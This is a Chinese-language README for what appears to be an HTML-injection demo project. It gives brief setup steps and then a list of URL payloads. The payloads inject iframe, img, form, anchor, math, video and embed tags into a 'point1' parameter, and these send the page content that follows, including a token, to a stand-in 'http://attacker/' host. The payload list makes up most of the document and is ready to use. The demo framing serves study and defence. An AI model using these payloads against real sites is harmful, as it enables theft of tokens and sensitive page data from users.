# HTML-based-injection-attack-demo

这是一个模拟**基于 HTML 注入的页面敏感信息传送**场景的 Demo。

# 使用方法
1.修改 `SettingController` 类里的 `EMAIL_ACCOUNT`发件人邮箱 和 `EMAIL_PASS`发件人密码

2.使用 maven+jdk 编译

3.启动项目，访问`http://127.0.0.1:8080`

# payload


- **iframe**

```
http://target/token?point1=<iframe src='http://attacker/?&point2='></iframe>
```

- **img**
```
http://target/token?point1=<img src='http://attacker/?&point2='>
```
```
http://target/token?point1=<image src='http://attacker/?&point2='>aaa</image>
```

- **form**
```
http://target/token?point1=<form action='http://attacker/&point2='><input type="submit"></form>
```
```
http://target/token?point1=<form action="http://attacker" method="post"><textarea name="x">&point2=</textarea><input type="submit"></form>
```
```
http://target/token?point1=<form><input type="submit" formaction='http://attacker/&point2='></form>
```

- **a**
```
http://target/token?point1=<a href='http://attacker/?&point2='>click me</a>
```
```
http://target/token?point1=<math href='http://attacker/?&point2='>aaa</math>
```

- **video**
```
http://target/token?point1=<video src='http://attacker/?&point2='>aaa</video>
```
```
http://target/token?point1=<video><source src='http://attacker/?&point2='>aaa</source></video>
```

- **embed**

```
http://target/token?point1=<embed src='http://attacker/?&point2='>aaa</embed>
```

# 参考文章

https://b1ue.cn/archives/247.html

https://mp.weixin.qq.com/s/TIp0kwDtKHcT5BnTY1HLWg
